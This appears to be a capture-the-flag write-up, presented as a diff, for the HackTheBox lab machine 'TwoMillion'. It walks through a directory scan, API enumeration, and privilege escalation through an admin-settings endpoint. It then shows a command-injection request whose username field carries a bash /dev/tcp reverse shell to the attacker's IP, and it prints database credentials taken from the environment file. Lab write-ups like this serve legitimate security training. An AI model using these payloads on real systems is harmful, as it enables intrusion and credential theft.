@@ -1,0 +1,127 @@
+Machine=TwoMillion | Creators=TRX & TheCyberGeek
+
+** To note, iterating over the specific api parameters and what was required took time **
+
+First off, I only found 2 ports, ssh on 22 and http on 80. Checking all other ports ended with all others closed.
+Attempting to connect to 10.10.11.221 resulted in a redirect that failed: 2million.htb
+This was added to /etc/hosts and I began exploring. This is where I learned of a new tool: FeroxBuster (very similar to DirBuster, just more visually appealing).
+Here I discovered many items which can be visualised below, one of the more interesting is /api
+________________________________________________________________________________________________________________________________________________________________________________________________________________                                                                                                                                                                          
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://2million.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+301      GET        7l       11w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+302      GET        0l        0w        0c http://2million.htb/logout => http://2million.htb/
+401      GET        0l        0w        0c http://2million.htb/api
+200      GET        1l        8w      637c http://2million.htb/js/inviteapi.min.js
+200      GET       27l      201w    15384c http://2million.htb/images/favicon.png
+405      GET        0l        0w        0c http://2million.htb/api/v1/user/register
+405      GET        0l        0w        0c http://2million.htb/api/v1/user/login
+200      GET       80l      232w     3704c http://2million.htb/login
+200      GET       96l      285w     3859c http://2million.htb/invite
+302      GET        0l        0w        0c http://2million.htb/home => http://2million.htb/
+200      GET      245l      317w    28522c http://2million.htb/images/logofull-tr-web.png
+200      GET      260l      328w    29158c http://2million.htb/images/logo-transparent.png
+200      GET       46l      152w     1674c http://2million.htb/404
+200      GET       13l     2209w   199494c http://2million.htb/css/htb-frontpage.css
+200      GET       13l     2458w   224695c http://2million.htb/css/htb-frontend.css
+200      GET        8l     3162w   254388c http://2million.htb/js/htb-frontpage.min.js
+200      GET     1242l     3326w    64952c http://2million.htb/
+200      GET        5l     1881w   145660c http://2million.htb/js/htb-frontend.min.js
+200      GET       94l      293w     4527c http://2million.htb/register
+405      GET        0l        0w        0c http://2million.htb/api/v1/invite/verify
+________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+Heading onto the invite page, it appears to get you onto the site, leading to the registry page, and finally the login page which gets you onto the platform.
+Looking deeper at the javascript code, it appears to have a strange lead of strings. Using some of these strings within a web terminal allows me to visualise that these are functions of the webpage.
+Using one of the specific functions "makeInviteCode" gives an encrypted response with the encryption method named in the header.
+Decrypting the ROT13 response allows me to make out that: "In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate"
+Doing the above leads to a base64 response which when decrypted, allows me to walk through the registration process and login to the system, here I am able to get a visual of the platform.
+
+The site claims to be undergoing database migrations, which has rendered some features unavailable. In truth, the majority of features are inaccessible. 
+Under the 'Main' section, the Dashboard, Rules, and Change Log links are functional and offer nostalgic throwbacks to the original HackTheBox interface.
+In the 'Labs' section, the only operational link is 'Access,' which directs users to /home/access. Within you are able to either regenerate or download a ovpn file.
+Looking at the backend however, it appears to be using API calls in order to perform such.
+
+I opened BurpSuite, turned on the proxy, moved to the repeater, and started digging.
+As we could see in the response code above of 401, we were now able to interact with the API without issue using api/v1 to gain an understanding.
+________________________________________________________________________________________________________________________________________________________________________________________________________________
+{
+  "v1": { 
+    "user": {
+      "GET": {
+        "/api/v1": "Route List",  
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation", 
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code",
+        "/api/v1/user/auth": "Check if user is authenticated",
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+        "/api/v1/user/vpn/download": "Download OVPN file"
+      },
+      "POST": {
+        "/api/v1/user/register": "Register a new user",
+        "/api/v1/user/login": "Login with existing user"
+      }
+    },
+    "admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+    }
+  }
+}
+________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+From here, I could see various other api calls that we could make, so I attempted to mess around.
+For 'admin' endpoint specifically, GET worked, POST did not, but PUT did.
+This PUT command allowed us to change a user's parameter of "is_admin" to true for my newly created account.
+I was then able to perform the below.
+
+This generated a successful VPN key.
+I then attempted to run command-injection by adding a semi-colon and attempting another command and using a # to prevent further iterative changes after my commands.
+Realising that I could use commands as the www-data user, I looked for a way to create a reverse shell.
+Finally, using this request within burpsuite, I was able to create a reverse shell, in which burpsuite recieved nothing as was blank in response. (nc -lvnp port#)
+
+________________________________________________________________________________________________________________________________________________________________________________________________________________
+POST /api/v1/admin/vpn/generate HTTP/1.1
+Host: 2million.htb
+Accept-Language: en-US,en;q=0.9
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=91a1daodlu9deu428oi8np2535
+Connection: keep-alive
+Content-Length: 89
+Content-Type: application/json
+
+{
+"username":"captainuser; bash -c 'bash -i >& /dev/tcp/10.10.14.27/3241 0>&1' #"
+}
+________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+Reading the enivornment file, we have some interesting details which appear to be replicated throughout the system for this user.
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
